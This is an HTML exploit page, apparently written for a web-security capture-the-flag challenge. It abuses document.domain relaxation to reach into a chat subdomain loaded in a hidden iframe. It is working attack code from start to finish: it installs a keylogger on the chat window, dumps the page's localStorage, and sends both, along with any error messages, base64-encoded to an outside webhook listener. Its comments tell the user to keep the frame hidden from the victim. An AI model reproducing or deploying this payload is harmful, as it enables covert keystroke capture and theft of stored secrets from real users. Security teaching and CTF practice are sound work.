<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SOP Relaxation Exploit</title>
</head>
<body>
    <h1>Processing...</h1>
    <script>
        // 1. RELAX THE DOMAIN
        // This must match the parent domain used by the challenge app.
        // Based on your URLs, it is likely 'websec.saarland'
        document.domain = "websec.saarland";

        // 2. TARGET THE CHAT SUBDOMAIN
        // Replace this with the exact URL of the chat interface
        const chatUrl = "https://owley-madison.jeopardy.websec.saarland/"; 
        
        // 3. YOUR EXFILTRATION LISTENER
        // Use a service like webhook.site or your own server
        const myListener = "https://webhook.site/a73c9568-0d8d-4636-b1f7-cf744ccfff37";

        // Create the iframe to the chat page
        const ifr = document.createElement('iframe');
        ifr.src = chatUrl;
        ifr.style.display = "none"; // Keep it hidden from the victim
        document.body.appendChild(ifr);

        ifr.onload = function() {
            console.log("Chat iframe loaded. Attempting to bridge...");
            
            try {
                // Because both pages have relaxed document.domain, 
                // we can now access the contentWindow of the chat!
                const targetWin = ifr.contentWindow;

                // 4. THE KEYLOGGER
                // Listen for keypresses inside the chat window
                targetWin.document.addEventListener('keyup', function(e) {
                    const data = {
                        key: e.key,
                        currentInput: e.target.value || "no-input-value",
                        time: Date.now()
                    };
                    
                    // Send captured keystrokes to your server
                    fetch(myListener + "?log=" + btoa(JSON.stringify(data)), {
                        mode: 'no-cors'
                    });
                });

                // 5. THE STORAGE STEALER
                // Additionally, check if the flag is already in the local storage
                const secret = JSON.stringify(targetWin.localStorage);
                fetch(myListener + "?storage=" + btoa(secret), {
                    mode: 'no-cors'
                });

                console.log("Keylogger installed successfully.");

            } catch (err) {
                // If this triggers, document.domain hasn't been relaxed correctly on one side
                fetch(myListener + "?error=" + btoa(err.message));
            }
        };
    </script>
</body>
</html>
